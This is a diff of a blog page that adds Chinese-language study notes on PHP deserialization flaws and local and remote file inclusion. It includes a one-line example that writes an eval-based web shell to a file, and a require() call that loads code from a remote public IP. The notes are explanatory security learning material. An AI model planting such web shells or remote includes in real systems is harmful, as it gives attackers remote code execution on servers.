@@ -635,14 +635,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        17k
+                        18.2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        63 分
+                        67 分
                     </div>
                     
                 
@@ -1657,7 +1657,52 @@ echo $a;
 <p>$_key=&gt;$_value是固定搭配，键值分离；$_key为数组里的键；$_value为数组里的值</p>
 <p>正常而言$a=1是一个定值，但是因为$$_key的缘故，当我传参a=2；那么$$_key=addslashes($_value);就变为了$a=2.</p>
 <p><strong>addslashes()：在每个引号前加一个反斜杠0</strong></p>
-<script>
+<h2 id="unserialize反序列化漏洞"><a href="#unserialize反序列化漏洞" class="headerlink" title="unserialize反序列化漏洞"></a>unserialize反序列化漏洞</h2><p>序列化=&gt;存档[保存当前的状态]    serialize()</p>
+<p>反序列化=&gt;读档[还原序列化时的状态]    unserialize()</p>
+<p>类：一种模板</p>
+<p>对象：对象就是看得见的物体我们进行操作、过程</p>
+<p>class就是类（标识）</p>
+<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。</p>
+<p>再类里面方法就是函数</p>
+<p>在类中有一些特殊的方法[函数]</p>
+<p>可以做到自动触发</p>
+<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>是一种自动触发的函数，满足条件就触发</p>
+<ul>
+<li>__construct：对象创建的时候会自动调用 </li>
+<li>__destruct：对象销毁的时候会自动调用</li>
+<li>__wakeup：在使用unserialize函数的时候会被调用</li>
+</ul>
+<p><strong>对象被调用后就会销毁</strong></p>
+<p>当对象要是用一个方法的时候要用“-&gt;”</p>
+<p>例：</p>
+<pre><code>$un = unserialize($class2);
+$un -&gt; ();</code></pre><p><strong>反序列化一定要白盒代码审计的</strong></p>
+<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>本质上serialize()和unserialize()在PHP内部实现上是没有漏洞的，漏洞的主要产生是由于应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</p>
+<p>当传给unserialize()的参数可控时，那么用户就可以注入精心构造的payload。当进行反序列化的时候就可能会触发对象中的一些魔术方法，造成意想不到的危害。</p>
+<h2 id="本地包含与远程包含"><a href="#本地包含与远程包含" class="headerlink" title="本地包含与远程包含"></a>本地包含与远程包含</h2><h3 id="什么是文件包含漏洞"><a href="#什么是文件包含漏洞" class="headerlink" title="什么是文件包含漏洞"></a>什么是文件包含漏洞</h3><p>攻击者利用包含的特性，加上应用本身对文件(包含)控制不严格，最终造成攻击者进行任意文件包含。(注：包含的文件会被当做脚本文件来解析)</p>
+<p>一句话来说既是：文件包含并不属于漏洞，但是，由于对包含进来的文件不可控，导致了文件包含漏洞的产生。</p>
+<p>注：包含文件很有用，可以简化代码</p>
+<p>文件包含分为本地和远程文件包含（需要allow_url_include = On）</p>
+<p>本地文件包含：LFI</p>
+<p>远程文件包含：RFI</p>
+<br>
+
+<p>假如你进入了后台，那么后台中的每一个页面应该都会验证你的权限，但是每个PHP文件中都写上验证的那段代码就会佷冗余，于是开发定义了一个文件包含函数，可以引用那个用于验证的代码写的文件。</p>
+<p><strong>那么这个文件里面的内容一定会被当作PHP执行，不管任何后缀</strong></p>
+<p>file_put_contents()：创建文件</p>
+<p>例：</p>
+<pre><code>&lt;?php file_put_contents('1.php','&lt;?php eval($_REQUEST[a])?&gt;');?&gt;</code></pre><p>当你能够任意控制包含的文件的时候，文件包含就有漏洞了</p>
+<p>本地文件包含：包含服务器上的资源，比如你上传的马</p>
+<p>远程文件包含：通过http协议包含其他地方的资源</p>
+<h3 id="函数解析-1"><a href="#函数解析-1" class="headerlink" title="函数解析"></a>函数解析</h3><p>include：使用include一你用外部文件时，只有代码执行到include代码段时，调用的外部文件才会被引用并读取，当引用的文件发生错误时，系统只会给出个警告错误，而整个php文件会继续执行。</p>
+<p>require：在 php文件被执行之前，php解析器会被引用的文件的全部内容替换require语句，然后与require语句之外的其他语句组成个新的php文件，最后按新的php文件执行代码程序。</p>
+<p>使用include_once会在导入文件前检测该文件是否在该页面的其他部分被应用过，如果有，则不会重复引用该文件，程序只能引用一次。（要导入的文件中存在一些自定义函数，那么如果在同一个程序中重复导入这个文件，在第二次导入时便会发生错误，因为php不允许相同名称的函数被重复声明）</p>
+<p>require_once语句是require语句的延伸，它的功能与require语句基本一只，不同的是，在应用require_once时，先会检查要引用的文件是不是已经在该程序中的其他地方被引用过，如果有，则不会再重复调用该文件。（同时使用require_once语句在同一页面中引用了两个不同的文件，那么在输出时，只有第一个文件被执行，第二个引用的文件则不会被执行）</p>
+<br>
+
+<p>PHP默认不能包含远程文件，需要开启allow_url_include = On</p>
+<p>在php的配置文件php_ini中可以修改这个，之后就可以在目标服务器上，例：</p>
+<pre><code>&lt;?php require('http://一个公网ip/要包含的文件')?&gt;</code></pre><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -2383,7 +2428,7 @@ address 192.168.0.
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">20.8k</span> 字
+                <span class="white-color">22k</span> 字
             
 
             
